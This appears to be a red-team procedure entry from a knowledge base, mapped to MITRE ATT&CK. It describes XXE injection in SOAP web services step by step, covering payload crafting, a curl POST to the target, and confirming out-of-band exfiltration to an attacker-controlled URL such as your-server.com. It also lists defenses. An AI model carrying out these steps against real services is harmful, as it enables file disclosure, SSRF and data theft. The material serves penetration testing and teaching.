---
id: f709e346-bac4-410d-9f65-faa55fb9f8eb
type: procedure
name: XXE-Injection-in-SOAP-Messages
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.594347+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
sub_techniques: []
tags:
  - '[[tags/XML External Entity]]'
  - '[[tags/XXE in SOAP]]'
  - xxe
  - soap
  - xml-injection
commands:
  - '[[commands/curl-send-soap-xxe]]'
platforms:
  - Web
tools: []
validated: true
---

# XXE-Injection-in-SOAP-Messages

## Summary

This procedure demonstrates how to exploit XML External Entity (XXE) vulnerabilities in SOAP-based web services to achieve data exfiltration or server-side request forgery (SSRF). By injecting a malicious external entity into a SOAP message, the XML parser on the server processes the entity, leading to unintended requests to attacker-controlled servers, potentially disclosing sensitive files or enabling further attacks like remote code execution.

## Description

SOAP (Simple Object Access Protocol) messages are XML-based and commonly used in web services for communication between applications. XXE vulnerabilities arise when the underlying XML parser allows external entity resolution without proper restrictions. In a typical attack scenario, an attacker identifies a SOAP endpoint vulnerable to XXE injection, crafts a payload that defines an external entity pointing to a controlled server (e.g., for out-of-band exfiltration), and submits it via a POST request. This can result in the server fetching remote resources, reading local files (e.g., /etc/passwd), or performing SSRF to internal services. The target environment is usually a web application with SOAP services exposed over HTTP/HTTPS, such as those built with Java (using libraries like Apache Axis) or .NET. Success depends on the parser configuration; modern frameworks often disable external entities by default, but legacy or misconfigured systems remain vulnerable. This technique maps to exploitation of public-facing applications and can facilitate command and control or data exfiltration in red team engagements.

## Requirements

1. Access to a SOAP-based web service endpoint (e.g., via HTTP POST to /service).
2. Knowledge of the SOAP message structure and any required authentication (e.g., basic auth or API keys).
3. An attacker-controlled server to receive exfiltrated data (e.g., a web server listening on port 80/443).
4. Tools like curl or Burp Suite for sending HTTP requests.
5. Basic understanding of XML and XXE payloads.

## Defense

- Disable external entity processing in XML parsers (e.g., set 'disallow-doctype-decl' to true in libxml2, or use secure parsers like OWASP ESAPI).
- Implement a web application firewall (WAF) to detect and block XML payloads containing DOCTYPE declarations or external entities.
- Validate and sanitize all XML inputs, rejecting any with entities or using whitelisting for allowed elements.
- Use HTTP security headers like Content-Security-Policy and monitor server logs for anomalous outbound requests.

## Objectives

1. Inject a malicious external entity into a SOAP message to trigger server-side resource fetching.
2. Exfiltrate sensitive data (e.g., local files) or perform SSRF to internal resources.
3. Establish a foundation for further attacks like remote code execution if the vulnerability allows.

## Instructions

### Step 1: Identify the SOAP Endpoint and Structure

**Context**: Determine the target SOAP service URL and understand the expected message format to embed the XXE payload without breaking the XML structure. Use tools like soapUI or browser dev tools to inspect legitimate requests.

Inspect the endpoint documentation or capture a valid SOAP request to note required namespaces (e.g., soap:Envelope) and body elements.

### Step 2: Craft the Malicious SOAP Payload

**Context**: Use the provided XXE payload code to define an external entity that points to your controlled server. Embed it within a CDATA section to bypass basic XML validation if present. Replace placeholders like the attacker URL with your setup (e.g., http://your-server.com/exfil).

Reference the payload: [[codes/SOAP-XXE-External-Entity-Payload]]

Save the modified XML to a file, e.g., malicious-soap.xml.

### Step 3: Send the Malicious SOAP Request

**Context**: Submit the crafted SOAP message to the target endpoint using an HTTP POST request. Monitor your attacker server for incoming requests, which indicate successful entity resolution and potential data exfiltration.

**Command** ([[commands/curl-send-soap-xxe]]):
```bash
curl -X POST -H "Content-Type: text/xml; charset=utf-8" -d @malicious-soap.xml $_TARGET_URL
```

> This command sends the XML payload to the SOAP endpoint. If successful, the server will resolve the external entity, making a GET request to your controlled URL, which may include exfiltrated data in query parameters or response body. Verify by checking your server logs for the incoming request.

### Step 4: Verify Exfiltration and Analyze Response

**Context**: Check the target server's response for errors or embedded data, and review your attacker server for received content. If file disclosure is achieved (e.g., via local file entities), the exfiltrated data will appear in the request to your server.

Monitor the curl output for any XML processing errors. On success, no explicit data may return in the response due to out-of-band nature; confirmation comes from your server receiving the request.

**Expected Output**: For the curl command, a 200 OK response from the SOAP service, possibly with a generic success message. On your attacker server: A GET request like http://your-server.com/?data=exfiltrated_content.
